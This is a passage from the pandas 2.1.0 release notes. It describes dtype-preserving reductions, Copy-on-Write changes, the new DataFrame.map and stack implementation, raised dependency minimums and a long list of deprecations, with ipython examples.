dtypes. Pandas can now keep the dtypes when doing reductions over DataFrame\ncolumns with a common dtype (:issue:`52788`).\n\n*Old Behavior*\n\n.. code-block:: ipython\n\n    In [1]: df = pd.DataFrame({\"a\": [1, 1, 2, 1], \"b\": [np.nan, 2.0, 3.0, 4.0]}, dtype=\"Int64\")\n    In [2]: df.sum()\n    Out[2]:\n    a    5\n    b    9\n    dtype: int64\n    In [3]: df = df.astype(\"int64[pyarrow]\")\n    In [4]: df.sum()\n    Out[4]:\n    a    5\n    b    9\n    dtype: int64\n\n*New Behavior*\n\n.. ipython:: python\n\n    df = pd.DataFrame({\"a\": [1, 1, 2, 1], \"b\": [np.nan, 2.0, 3.0, 4.0]}, dtype=\"Int64\")\n    df.sum()\n    df = df.astype(\"int64[pyarrow]\")\n    df.sum()\n\nNotice that the dtype is now a masked dtype and PyArrow dtype, respectively, while previously it was a NumPy integer dtype.\n\nTo allow DataFrame reductions to preserve extension dtypes, :meth:`.ExtensionArray._reduce` has gotten a new keyword parameter ``keepdims``. Calling :meth:`.ExtensionArray._reduce` with ``keepdims=True`` should return an array of length 1 along the reduction axis. In order to maintain backward compatibility, the parameter is not required, but will it become required in the future. If the parameter is not found in the signature, DataFrame reductions can not preserve extension dtypes. Also, if the parameter is not found, a ``FutureWarning`` will be emitted and type checkers like mypy may complain about the signature not being compatible with :meth:`.ExtensionArray._reduce`.\n\n.. _whatsnew_210.enhancements.cow:\n\nCopy-on-Write improvements\n^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- :meth:`Series.transform` not respecting Copy-on-Write when ``func`` modifies :class:`Series` inplace (:issue:`53747`)\n- Calling :meth:`Index.values` will now return a read-only NumPy array (:issue:`53704`)\n- Setting a :class:`Series` into a :class:`DataFrame` now creates a lazy instead of a deep copy (:issue:`53142`)\n- The :class:`DataFrame` constructor, when constructing a DataFrame from a dictionary\n  of Index objects and specifying ``copy=False``, will now use a lazy copy\n  of those Index objects for the columns of the DataFrame (:issue:`52947`)\n- A shallow copy of a Series or DataFrame (``df.copy(deep=False)``) will now also return\n  a shallow copy of the rows/columns :class:`Index` objects instead of only a shallow copy of\n  the data, i.e. the index of the result is no longer identical\n  (``df.copy(deep=False).index is df.index`` is no longer True) (:issue:`53721`)\n- :meth:`DataFrame.head` and :meth:`DataFrame.tail` will now return deep copies (:issue:`54011`)\n- Add lazy copy mechanism to :meth:`DataFrame.eval` (:issue:`53746`)\n\n- Trying to operate inplace on a temporary column selection\n  (for example, ``df[\"a\"].fillna(100, inplace=True)``)\n  will now always raise a warning when Copy-on-Write is enabled. In this mode,\n  operating inplace like this will never work, since the selection behaves\n  as a temporary copy. This holds true for:\n\n  - DataFrame.update / Series.update\n  - DataFrame.fillna / Series.fillna\n  - DataFrame.replace / Series.replace\n  - DataFrame.clip / Series.clip\n  - DataFrame.where / Series.where\n  - DataFrame.mask / Series.mask\n  - DataFrame.interpolate / Series.interpolate\n  - DataFrame.ffill / Series.ffill\n  - DataFrame.bfill / Series.bfill\n\n.. _whatsnew_210.enhancements.map_na_action:\n\nNew :meth:`DataFrame.map` method and support for ExtensionArrays\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe :meth:`DataFrame.map` been added and :meth:`DataFrame.applymap` has been deprecated. :meth:`DataFrame.map` has the same functionality as :meth:`DataFrame.applymap`, but the new name better communicates that this is the :class:`DataFrame` version of :meth:`Series.map` (:issue:`52353`).\n\nWhen given a callable, :meth:`Series.map` applies the callable to all elements of the :class:`Series`.\nSimilarly, :meth:`DataFrame.map` applies the callable to all elements of the :class:`DataFrame`,\nwhile :meth:`Index.map` applies the callable to all elements of the :class:`Index`.\n\nFrequently, it is not desirable to apply the callable to nan-like values of the array and to avoid doing\nthat, the ``map`` method could be called with ``na_action=\"ignore\"``, i.e. ``ser.map(func, na_action=\"ignore\")``.\nHowever, ``na_action=\"ignore\"`` was not implemented for many :class:`.ExtensionArray` and ``Index`` types\nand ``na_action=\"ignore\"`` did not work correctly for any :class:`.ExtensionArray` subclass except the nullable numeric ones (i.e. with dtype :class:`Int64` etc.).\n\n``na_action=\"ignore\"`` now works for all array types (:issue:`52219`, :issue:`51645`, :issue:`51809`, :issue:`51936`, :issue:`52033`; :issue:`52096`).\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [1]: ser = pd.Series([\"a\", \"b\", np.nan], dtype=\"category\")\n    In [2]: ser.map(str.upper, na_action=\"ignore\")\n    NotImplementedError\n    In [3]: df = pd.DataFrame(ser)\n    In [4]: df.applymap(str.upper, na_action=\"ignore\")  # worked for DataFrame\n         0\n    0    A\n    1    B\n    2  NaN\n    In [5]: idx = pd.Index(ser)\n    In [6]: idx.map(str.upper, na_action=\"ignore\")\n    TypeError: CategoricalIndex.map() got an unexpected keyword argument 'na_action'\n\n*New behavior*:\n\n.. ipython:: python\n\n    ser = pd.Series([\"a\", \"b\", np.nan], dtype=\"category\")\n    ser.map(str.upper, na_action=\"ignore\")\n    df = pd.DataFrame(ser)\n    df.map(str.upper, na_action=\"ignore\")\n    idx = pd.Index(ser)\n    idx.map(str.upper, na_action=\"ignore\")\n\nAlso, note that :meth:`Categorical.map` implicitly has had its ``na_action`` set to ``\"ignore\"`` by default.\nThis has been deprecated and the default for :meth:`Categorical.map` will change\nto ``na_action=None``, consistent with all the other array types.\n\n.. _whatsnew_210.enhancements.new_stack:\n\nNew implementation of :meth:`DataFrame.stack`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\npandas has reimplemented :meth:`DataFrame.stack`. To use the new implementation, pass the argument ``future_stack=True``. This will become the only option in pandas 3.0.\n\nThe previous implementation had two main behavioral downsides.\n\n1. The previous implementation would unnecessarily introduce NA values into the result. The user could have NA values automatically removed by passing ``dropna=True`` (the default), but doing this could also remove NA values from the result that existed in the input. See the examples below.\n2. The previous implementation with ``sort=True`` (the default) would sometimes sort part of the resulting index, and sometimes not. If the input's columns are *not* a :class:`MultiIndex`, then the resulting index would never be sorted. If the columns are a :class:`MultiIndex`, then in most cases the level(s) in the resulting index that come from stacking the column level(s) would be sorted. In rare cases such level(s) would be sorted in a non-standard order, depending on how the columns were created.\n\nThe new implementation (``future_stack=True``) will no longer unnecessarily introduce NA values when stacking multiple levels and will never sort. As such, the arguments ``dropna`` and ``sort`` are not utilized and must remain unspecified when using ``future_stack=True``. These arguments will be removed in the next major release.\n\n.. ipython:: python\n\n    columns = pd.MultiIndex.from_tuples([(\"B\", \"d\"), (\"A\", \"c\")])\n    df = pd.DataFrame([[0, 2], [1, 3]], index=[\"z\", \"y\"], columns=columns)\n    df\n\nIn the previous version (``future_stack=False``), the default of ``dropna=True`` would remove unnecessarily introduced NA values but still coerce the dtype to ``float64`` in the process. In the new version, no NAs are introduced and so there is no coercion of the dtype.\n\n.. ipython:: python\n    :okwarning:\n\n    df.stack([0, 1], future_stack=False, dropna=True)\n    df.stack([0, 1], future_stack=True)\n\nIf the input contains NA values, the previous version would drop those as well with ``dropna=True`` or introduce new NA values with ``dropna=False``. The new version persists all values from the input.\n\n.. ipython:: python\n    :okwarning:\n\n    df = pd.DataFrame([[0, 2], [np.nan, np.nan]], columns=columns)\n    df\n    df.stack([0, 1], future_stack=False, dropna=True)\n    df.stack([0, 1], future_stack=False, dropna=False)\n    df.stack([0, 1], future_stack=True)\n\n.. _whatsnew_210.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n- :meth:`Series.ffill` and :meth:`Series.bfill` are now supported for objects with :class:`IntervalDtype` (:issue:`54247`)\n- Added ``filters`` parameter to :func:`read_parquet` to filter out data, compatible with both ``engines`` (:issue:`53212`)\n- :meth:`.Categorical.map` and :meth:`CategoricalIndex.map` now have a ``na_action`` parameter.\n  :meth:`.Categorical.map` implicitly had a default value of ``\"ignore\"`` for ``na_action``. This has formally been deprecated and will be changed to ``None`` in the future.\n  Also notice that :meth:`Series.map` has default ``na_action=None`` and calls to series with categorical data will now use ``na_action=None`` unless explicitly set otherwise (:issue:`44279`)\n- :class:`api.extensions.ExtensionArray` now has a :meth:`~api.extensions.ExtensionArray.map` method (:issue:`51809`)\n- :meth:`DataFrame.applymap` now uses the :meth:`~api.extensions.ExtensionArray.map` method of underlying :class:`api.extensions.ExtensionArray` instances (:issue:`52219`)\n- :meth:`MultiIndex.sort_values` now supports ``na_position`` (:issue:`51612`)\n- :meth:`MultiIndex.sortlevel` and :meth:`Index.sortlevel` gained a new keyword ``na_position`` (:issue:`51612`)\n- :meth:`arrays.DatetimeArray.map`, :meth:`arrays.TimedeltaArray.map` and :meth:`arrays.PeriodArray.map` can now take a ``na_action`` argument (:issue:`51644`)\n- :meth:`arrays.SparseArray.map` now supports ``na_action`` (:issue:`52096`).\n- :meth:`pandas.read_html` now supports the ``storage_options`` keyword when used with a URL, allowing users to add headers to the outbound HTTP request (:issue:`49944`)\n- Add :meth:`Index.diff` and :meth:`Index.round` (:issue:`19708`)\n- Add ``\"latex-math\"`` as an option to the ``escape`` argument of :class:`.Styler` which will not escape all characters between ``\"\\(\"`` and ``\"\\)\"`` during formatting (:issue:`51903`)\n- Add dtype of categories to ``repr`` information of :class:`CategoricalDtype` (:issue:`52179`)\n- Adding ``engine_kwargs`` parameter to :func:`read_excel` (:issue:`52214`)\n- Classes that are useful for type-hinting have been added to the public API in the new submodule ``pandas.api.typing`` (:issue:`48577`)\n- Implemented :attr:`Series.dt.is_month_start`, :attr:`Series.dt.is_month_end`, :attr:`Series.dt.is_year_start`, :attr:`Series.dt.is_year_end`, :attr:`Series.dt.is_quarter_start`, :attr:`Series.dt.is_quarter_end`, :attr:`Series.dt.days_in_month`, :attr:`Series.dt.unit`, :attr:`Series.dt.normalize`, :meth:`Series.dt.day_name`, :meth:`Series.dt.month_name`, :meth:`Series.dt.tz_convert` for :class:`ArrowDtype` with ``pyarrow.timestamp`` (:issue:`52388`, :issue:`51718`)\n- :meth:`.DataFrameGroupBy.agg` and :meth:`.DataFrameGroupBy.transform` now support grouping by multiple keys when the index is not a :class:`MultiIndex` for ``engine=\"numba\"`` (:issue:`53486`)\n- :meth:`.SeriesGroupBy.agg` and :meth:`.DataFrameGroupBy.agg` now support passing in multiple functions for ``engine=\"numba\"`` (:issue:`53486`)\n- :meth:`.SeriesGroupBy.transform` and :meth:`.DataFrameGroupBy.transform` now support passing in a string as the function for ``engine=\"numba\"`` (:issue:`53579`)\n- :meth:`DataFrame.stack` gained the ``sort`` keyword to dictate whether the resulting :class:`MultiIndex` levels are sorted (:issue:`15105`)\n- :meth:`DataFrame.unstack` gained the ``sort`` keyword to dictate whether the resulting :class:`MultiIndex` levels are sorted (:issue:`15105`)\n- :meth:`Series.explode` now supports PyArrow-backed list types (:issue:`53602`)\n- :meth:`Series.str.join` now supports ``ArrowDtype(pa.string())`` (:issue:`53646`)\n- Add ``validate`` parameter to :meth:`Categorical.from_codes` (:issue:`50975`)\n- Added :meth:`.ExtensionArray.interpolate` used by :meth:`Series.interpolate` and :meth:`DataFrame.interpolate` (:issue:`53659`)\n- Added ``engine_kwargs`` parameter to :meth:`DataFrame.to_excel` (:issue:`53220`)\n- Implemented :func:`api.interchange.from_dataframe` for :class:`DatetimeTZDtype` (:issue:`54239`)\n- Implemented ``__from_arrow__`` on :class:`DatetimeTZDtype` (:issue:`52201`)\n- Implemented ``__pandas_priority__`` to allow custom types to take precedence over :class:`DataFrame`, :class:`Series`, :class:`Index`, or :class:`.ExtensionArray` for arithmetic operations, :ref:`see the developer guide <extending.pandas_priority>` (:issue:`48347`)\n- Improve error message when having incompatible columns using :meth:`DataFrame.merge` (:issue:`51861`)\n- Improve error message when setting :class:`DataFrame` with wrong number of columns through :meth:`DataFrame.isetitem` (:issue:`51701`)\n- Improved error handling when using :meth:`DataFrame.to_json` with incompatible ``index`` and ``orient`` arguments (:issue:`52143`)\n- Improved error message when creating a DataFrame with empty data (0 rows), no index and an incorrect number of columns (:issue:`52084`)\n- Improved error message when providing an invalid ``index`` or ``offset`` argument to :class:`.VariableOffsetWindowIndexer` (:issue:`54379`)\n- Let :meth:`DataFrame.to_feather` accept a non-default :class:`Index` and non-string column names (:issue:`51787`)\n- Added a new parameter ``by_row`` to :meth:`Series.apply` and :meth:`DataFrame.apply`. When set to ``False`` the supplied callables will always operate on the whole Series or DataFrame (:issue:`53400`, :issue:`53601`).\n- :meth:`DataFrame.shift` and :meth:`Series.shift` now allow shifting by multiple periods by supplying a list of periods (:issue:`44424`)\n- Groupby aggregations with ``numba`` (such as :meth:`.DataFrameGroupBy.sum`) now can preserve the dtype of the input instead of casting to ``float64`` (:issue:`44952`)\n- Improved error message when :meth:`.DataFrameGroupBy.agg` failed (:issue:`52930`)\n- Many read/to_* functions, such as :meth:`DataFrame.to_pickle` and :func:`read_csv`, support forwarding compression arguments to ``lzma.LZMAFile`` (:issue:`52979`)\n- Reductions :meth:`Series.argmax`, :meth:`Series.argmin`, :meth:`Series.idxmax`, :meth:`Series.idxmin`, :meth:`Index.argmax`, :meth:`Index.argmin`, :meth:`DataFrame.idxmax`, :meth:`DataFrame.idxmin` are now supported for object-dtype (:issue:`4279`, :issue:`18021`, :issue:`40685`, :issue:`43697`)\n- :meth:`DataFrame.to_parquet` and :func:`read_parquet` will now write and read ``attrs`` respectively (:issue:`54346`)\n- :meth:`Index.all` and :meth:`Index.any` with floating dtypes and timedelta64 dtypes no longer raise ``TypeError``, matching the :meth:`Series.all` and :meth:`Series.any` behavior (:issue:`54566`)\n- :meth:`Series.cummax`, :meth:`Series.cummin` and :meth:`Series.cumprod` are now supported for pyarrow dtypes with pyarrow version 13.0 and above (:issue:`52085`)\n- Added support for the DataFrame Consortium Standard (:issue:`54383`)\n- Performance improvement in :meth:`.DataFrameGroupBy.quantile` and :meth:`.SeriesGroupBy.quantile` (:issue:`51722`)\n- PyArrow-backed integer dtypes now support bitwise operations (:issue:`54495`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_210.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_210.api_breaking.deps:\n\nIncreased minimum version for Python\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\npandas 2.1.0 supports Python 3.9 and higher.\n\nIncreased minimum versions for dependencies\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nSome minimum supported versions of dependencies were updated.\nIf installed, we now require:\n\n+----------------------+-----------------+----------+---------+\n| Package              | Minimum Version | Required | Changed |\n+======================+=================+==========+=========+\n| numpy                | 1.22.4          |    X     |    X    |\n+----------------------+-----------------+----------+---------+\n| mypy (dev)           | 1.4.1           |          |    X    |\n+----------------------+-----------------+----------+---------+\n| beautifulsoup4       | 4.11.1          |          |    X    |\n+----------------------+-----------------+----------+---------+\n| bottleneck           | 1.3.4           |          |    X    |\n+----------------------+-----------------+----------+---------+\n| dataframe-api-compat | 0.1.7           |          |    X    |\n+----------------------+-----------------+----------+---------+\n| fastparquet          | 0.8.1           |          |    X    |\n+----------------------+-----------------+----------+---------+\n| fsspec               | 2022.05.0       |          |    X    |\n+----------------------+-----------------+----------+---------+\n| hypothesis           | 6.46.1          |          |    X    |\n+----------------------+-----------------+----------+---------+\n| gcsfs                | 2022.05.0       |          |    X    |\n+----------------------+-----------------+----------+---------+\n| jinja2               | 3.1.2           |          |    X    |\n+----------------------+-----------------+----------+---------+\n| lxml                 | 4.8.0           |          |    X    |\n+----------------------+-----------------+----------+---------+\n| numba                | 0.55.2          |          |    X    |\n+----------------------+-----------------+----------+---------+\n| numexpr              | 2.8.0           |          |    X    |\n+----------------------+-----------------+----------+---------+\n| openpyxl             | 3.0.10          |          |    X    |\n+----------------------+-----------------+----------+---------+\n| pandas-gbq           | 0.17.5          |          |    X    |\n+----------------------+-----------------+----------+---------+\n| psycopg2             | 2.9.3           |          |    X    |\n+----------------------+-----------------+----------+---------+\n| pyreadstat           | 1.1.5           |          |    X    |\n+----------------------+-----------------+----------+---------+\n| pyqt5                | 5.15.6          |          |    X    |\n+----------------------+-----------------+----------+---------+\n| pytables             | 3.7.0           |          |    X    |\n+----------------------+-----------------+----------+---------+\n| pytest               | 7.3.2           |          |    X    |\n+----------------------+-----------------+----------+---------+\n| python-snappy        | 0.6.1           |          |    X    |\n+----------------------+-----------------+----------+---------+\n| pyxlsb               | 1.0.9           |          |    X    |\n+----------------------+-----------------+----------+---------+\n| s3fs                 | 2022.05.0       |          |    X    |\n+----------------------+-----------------+----------+---------+\n| scipy                | 1.8.1           |          |    X    |\n+----------------------+-----------------+----------+---------+\n| sqlalchemy           | 1.4.36          |          |    X    |\n+----------------------+-----------------+----------+---------+\n| tabulate             | 0.8.10          |          |    X    |\n+----------------------+-----------------+----------+---------+\n| xarray               | 2022.03.0       |          |    X    |\n+----------------------+-----------------+----------+---------+\n| xlsxwriter           | 3.0.3           |          |    X    |\n+----------------------+-----------------+----------+---------+\n| zstandard            | 0.17.0          |          |    X    |\n+----------------------+-----------------+----------+---------+\n\nFor `optional libraries <https://pandas.pydata.org/docs/getting_started/install.html>`_ the general recommendation is to use the latest version.\n\nSee :ref:`install.dependencies` and :ref:`install.optional_dependencies` for more.\n\n.. _whatsnew_210.api_breaking.other:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n- :class:`arrays.PandasArray` has been renamed :class:`.NumpyExtensionArray` and the attached dtype name changed from ``PandasDtype`` to ``NumpyEADtype``; importing ``PandasArray`` still works until the next major version (:issue:`53694`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_210.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\nDeprecated silent upcasting in setitem-like Series operations\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPDEP-6: https://pandas.pydata.org/pdeps/0006-ban-upcasting.html\n\nSetitem-like operations on Series (or DataFrame columns) which silently upcast the dtype are\ndeprecated and show a warning. Examples of affected operations are:\n\n- ``ser.fillna('foo', inplace=True)``\n- ``ser.where(ser.isna(), 'foo', inplace=True)``\n- ``ser.iloc[indexer] = 'foo'``\n- ``ser.loc[indexer] = 'foo'``\n- ``df.iloc[indexer, 0] = 'foo'``\n- ``df.loc[indexer, 'a'] = 'foo'``\n- ``ser[indexer] = 'foo'``\n\nwhere ``ser`` is a :class:`Series`, ``df`` is a :class:`DataFrame`, and ``indexer``\ncould be a slice, a mask, a single value, a list or array of values, or any other\nallowed indexer.\n\nIn a future version, these will raise an error and you should cast to a common dtype first.\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n  In [1]: ser = pd.Series([1, 2, 3])\n\n  In [2]: ser\n  Out[2]:\n  0    1\n  1    2\n  2    3\n  dtype: int64\n\n  In [3]: ser[0] = 'not an int64'\n\n  In [4]: ser\n  Out[4]:\n  0    not an int64\n  1               2\n  2               3\n  dtype: object\n\n*New behavior*:\n\n.. code-block:: ipython\n\n  In [1]: ser = pd.Series([1, 2, 3])\n\n  In [2]: ser\n  Out[2]:\n  0    1\n  1    2\n  2    3\n  dtype: int64\n\n  In [3]: ser[0] = 'not an int64'\n  FutureWarning:\n    Setting an item of incompatible dtype is deprecated and will raise an error in a future version of pandas.\n    Value 'not an int64' has dtype incompatible with int64, please explicitly cast to a compatible dtype first.\n\n  In [4]: ser\n  Out[4]:\n  0    not an int64\n  1               2\n  2               3\n  dtype: object\n\nTo retain the current behaviour, in the case above you could cast ``ser`` to ``object`` dtype first:\n\n.. ipython:: python\n\n  ser = pd.Series([1, 2, 3])\n  ser = ser.astype('object')\n  ser[0] = 'not an int64'\n  ser\n\nDepending on the use-case, it might be more appropriate to cast to a different dtype.\nIn the following, for example, we cast to ``float64``:\n\n.. ipython:: python\n\n  ser = pd.Series([1, 2, 3])\n  ser = ser.astype('float64')\n  ser[0] = 1.1\n  ser\n\nFor further reading, please see https://pandas.pydata.org/pdeps/0006-ban-upcasting.html.\n\nDeprecated parsing datetimes with mixed time zones\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nParsing datetimes with mixed time zones is deprecated and shows a warning unless user passes ``utc=True`` to :func:`to_datetime` (:issue:`50887`)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n  In [7]: data = [\"2020-01-01 00:00:00+06:00\", \"2020-01-01 00:00:00+01:00\"]\n\n  In [8]:  pd.to_datetime(data, utc=False)\n  Out[8]:\n  Index([2020-01-01 00:00:00+06:00, 2020-01-01 00:00:00+01:00], dtype='object')\n\n*New behavior*:\n\n.. code-block:: ipython\n\n  In [9]: pd.to_datetime(data, utc=False)\n  FutureWarning:\n    In a future version of pandas, parsing datetimes with mixed time zones will raise\n    a warning unless `utc=True`. Please specify `utc=True` to opt in to the new behaviour\n    and silence this warning. To create a `Series` with mixed offsets and `object` dtype,\n    please use `apply` and `datetime.datetime.strptime`.\n  Index([2020-01-01 00:00:00+06:00, 2020-01-01 00:00:00+01:00], dtype='object')\n\nIn order to silence this warning and avoid an error in a future version of pandas,\nplease specify ``utc=True``:\n\n.. ipython:: python\n\n    data = [\"2020-01-01 00:00:00+06:00\", \"2020-01-01 00:00:00+01:00\"]\n    pd.to_datetime(data, utc=True)\n\nTo create a ``Series`` with mixed offsets and ``object`` dtype, please use ``apply``\nand ``datetime.datetime.strptime``:\n\n.. ipython:: python\n\n    import datetime as dt\n\n    data = [\"2020-01-01 00:00:00+06:00\", \"2020-01-01 00:00:00+01:00\"]\n    pd.Series(data).apply(lambda x: dt.datetime.strptime(x, '%Y-%m-%d %H:%M:%S%z'))\n\nOther Deprecations\n^^^^^^^^^^^^^^^^^^\n- Deprecated :attr:`.DataFrameGroupBy.dtypes`, check ``dtypes`` on the underlying object instead (:issue:`51045`)\n- Deprecated :attr:`DataFrame._data` and :attr:`Series._data`, use public APIs instead (:issue:`33333`)\n- Deprecated :func:`concat` behavior when any of the objects being concatenated have length 0; in the past the dtypes of empty objects were ignored when determining the resulting dtype, in a future version they will not (:issue:`39122`)\n- Deprecated :meth:`.Categorical.to_list`, use ``obj.tolist()`` instead (:issue:`51254`)\n- Deprecated :meth:`.DataFrameGroupBy.all` and :meth:`.DataFrameGroupBy.any` with datetime64 or :class:`PeriodDtype` values, matching the :class:`Series` and :class:`DataFrame` deprecations (:issue:`34479`)\n- Deprecated ``axis=1`` in :meth:`DataFrame.ewm`, :meth:`DataFrame.rolling`, :meth:`DataFrame.expanding`, transpose before calling the method instead (:issue:`51778`)\n- Deprecated ``axis=1`` in :meth:`DataFrame.groupby` and in :class:`Grouper` constructor, do ``frame.T.groupby(...)`` instead (:issue:`51203`)\n- Deprecated ``broadcast_axis`` keyword in :meth:`Series.align` and :meth:`DataFrame.align`, upcast before calling ``align`` with ``left = DataFrame({col: left for col in right.columns}, index=right.index)`` (:issue:`51856`)\n- Deprecated ``downcast`` keyword in :meth:`Index.fillna` (:issue:`53956`)\n- Deprecated ``fill_method`` and ``limit`` keywords in :meth:`DataFrame.pct_change`, :meth:`Series.pct_change`, :meth:`.DataFrameGroupBy.pct_change`, and :meth:`.SeriesGroupBy.pct_change`, explicitly call e.g. :meth:`DataFrame.ffill` or :meth:`DataFrame.bfill` before calling ``pct_change`` instead (:issue:`53491`)\n- Deprecated ``method``, ``limit``, and ``fill_axis`` keywords in :meth:`DataFrame.align` and :meth:`Series.align`, explicitly call :meth:`DataFrame.fillna` or :meth:`Series.fillna` on the alignment results instead (:issue:`51856`)\n- Deprecated ``quantile`` keyword in :meth:`.Rolling.quantile` and :meth:`.Expanding.quantile`, renamed to ``q`` instead (:issue:`52550`)\n- Deprecated accepting slices in :meth:`DataFrame.take`, call ``obj[slicer]`` or pass a sequence of integers instead (:issue:`51539`)\n- Deprecated behavior of :meth:`DataFrame.idxmax`, :meth:`DataFrame.idxmin`, :meth:`Series.idxmax`, :meth:`Series.idxmin` in with all-NA entries or any-NA and ``skipna=False``; in a future version these will raise ``ValueError`` (:issue:`51276`)\n- Deprecated explicit support for subclassing :class:`Index` (:issue:`45289`)\n- Deprecated making functions given to :meth:`Series.agg` attempt to operate on each element in the :class:`Series` and only operate on the whole :class:`Series` if the elementwise operations failed. In the future, functions given to :meth:`Series.agg` will always operate on the whole :class:`Series` only. To keep the current behavior, use :meth:`Series.transform` instead (:issue:`53325`)\n- Deprecated making the functions in a list of functions given to :meth:`DataFrame.agg` attempt to operate on each element in the :class:`DataFrame` and only operate on the columns of the :class:`DataFrame` if the elementwise operations failed. To keep the current behavior, use :meth:`DataFrame.transform` instead (:issue:`53325`)\n- Deprecated passing a :class:`DataFrame` to :meth:`DataFrame.from_records`, use :meth:`DataFrame.set_index` or :meth:`DataFrame.drop` instead (:issue:`51353`)\n- Deprecated silently dropping unrecognized timezones when parsing strings to datetimes (:issue:`18702`)\n- Deprecated the ``axis`` keyword in :meth:`DataFrame.ewm`, :meth:`Series.ewm`, :meth:`DataFrame.rolling`, :meth:`Series.rolling`, :meth:`DataFrame.expanding`, :meth:`Series.expanding` (:issue:`51778`)\n- Deprecated the ``axis`` keyword in :meth:`DataFrame.resample`, :meth:`Series.resample` (:issue:`51778`)\n- Deprecated the ``downcast`` keyword in :meth:`Series.interpolate`, :meth:`DataFrame.interpolate`, :meth:`Series.fillna`, :meth:`DataFrame.fillna`, :meth:`Series.ffill`, :meth:`DataFrame.ffill`, :meth:`Series.bfill`, :meth:`DataFrame.bfill` (:issue:`40988`)\n- Deprecated the behavior of :func:`concat` with both ``len(keys) != len(objs)``, in a future version this will raise instead of truncating to the shorter of the two sequences (:issue:`43485`)\n- Deprecated the behavior of :meth:`Series.argsort` in the presence of NA values; in a future version these will be sorted at the end instead of giving -1 (:issue:`54219`)\n- Deprecated the default of ``observed=False`` in :meth:`DataFrame.groupby` and :meth:`Series.groupby`; this will default to ``True`` in a future version (:issue:`43999`)\n- Deprecating pinning ``group.name`` to each group in :meth:`.SeriesGroupBy.aggregate` aggregations; if your operation requires utilizing the groupby keys, iterate over the groupby object instead (:issue:`41090`)\n- Deprecated the ``axis`` keyword in :meth:`.DataFrameGroupBy.idxmax`, :meth:`.DataFrameGroupBy.idxmin`, :meth:`.DataFrameGroupBy.fillna`, :meth:`.DataFrameGroupBy.take`, :meth:`.DataFrameGroupBy.skew`, :meth:`.DataFrameGroupBy.rank`, :meth:`.DataFrameGroupBy.cumprod`, :meth:`.DataFrameGroupBy.cumsum`, :meth:`.DataFrameGroupBy.cummax`, :meth:`.DataFrameGroupBy.cummin`, :meth:`.DataFrameGroupBy.pct_change`, :meth:`.DataFrameGroupBy.diff`, :meth:`.DataFrameGroupBy.shift`, and :meth:`.DataFrameGroupBy.corrwith`; for ``axis=1`` operate on the underlying :class:`DataFrame` instead (:issue:`50405`, :issue:`51046`)\n- Deprecated :class:`.DataFrameGroupBy` with ``as_index=False`` not including groupings in the result when they are not columns of the DataFrame (:issue:`49519`)\n- Deprecated :func:`is_categorical_dtype`, use ``isinstance(obj.dtype, pd.CategoricalDtype)`` instead (:issue:`52527`)\n- Deprecated :func:`is_datetime64tz_dtype`, check ``isinstance(dtype, pd.DatetimeTZDtype)`` instead (:issue:`52607`)\n- Deprecated :func:`is_int64_dtype`, check ``dtype == np.dtype(np.int64)`` instead (:issue:`52564`)\n- Deprecated :func:`is_interval_dtype`, check ``isinstance(dtype, pd.IntervalDtype)`` instead (:issue:`52607`)\n- Deprecated :func:`is_period_dtype`, check ``isinstance(dtype, pd.PeriodDtype)`` instead (:issue:`52642`)\n- Deprecated :func:`is_sparse`, check ``isinstance(dtype, pd.SparseDtype)`` instead (:issue:`52642`)\n- Deprecated :meth:`.Styler.applymap_index`. Use the new :meth:`.Styler.map_index` method instead (:issue:`52708`)\n- Deprecated :meth:`.Styler.applymap`. Use the new :meth:`.Styler.map` method instead (:issue:`52708`)\n- Deprecated :meth:`DataFrame.applymap`. Use the new :meth:`DataFrame.map` method instead (:issue:`52353`)\n- Deprecated :meth:`DataFrame.swapaxes` and :meth:`Series.swapaxes`, use :meth:`DataFrame.transpose` or :meth:`Series.transpose` instead (:issue:`51946`)\n- Deprecated ``freq`` parameter in :class:`.PeriodArray` constructor, pass ``dtype`` instead (:issue:`52462`)\n- Deprecated allowing non-standard inputs in :func:`take`, pass either a ``numpy.ndarray``, :class:`.ExtensionArray`, :class:`Index`, or :class:`Series` (:issue:`52981`)\n- Deprecated allowing non-standard sequences for :func:`isin`, :func:`value_counts`, :func:`unique`, :func:`factorize`, case to one of ``numpy.ndarray``, :class:`Index`, :class:`.ExtensionArray`, or :class:`Series` before calling (:issue:`52986`)\n- Deprecated behavior of :class:`DataFrame` reductions ``sum``, ``prod``, ``std``, ``var``, ``sem`` with ``axis=None``, in a future version this will operate over both axes returning a scalar instead of behaving like ``axis=0``; note this also affects numpy functions e.g. ``np.sum(df)`` (:issue:`21597`)\n- Deprecated behavior of :func:`concat` when :class:`DataFrame` has columns that are all-NA, in a future version these will not be discarded when determining the resulting dtype (:issue:`40893`)\n- Deprecated behavior of :meth:`Series.dt.to_pydatetime`, in a future version this will return a :class:`Series` containing python ``datetime`` objects instead of an ``ndarray`` of datetimes; this matches the behavior of other :attr:`Series.dt` properties (:issue:`20306`)\n- Deprecated logical operations (``|``, ``&``, ``^``) between pandas objects and dtype-less sequences (e.g. ``list``, ``tuple``), wrap a sequence in a :class:`Series` or NumPy array before operating instead (:issue:`51521`)\n- Deprecated parameter ``convert_type`` in :meth:`Series.apply` (:issue:`52140`)\n- Deprecated passing a dictionary to :meth:`.SeriesGroupBy.agg`; pass a list of aggregations instead (:issue:`50684`)\n- Deprecated the ``fastpath`` keyword in 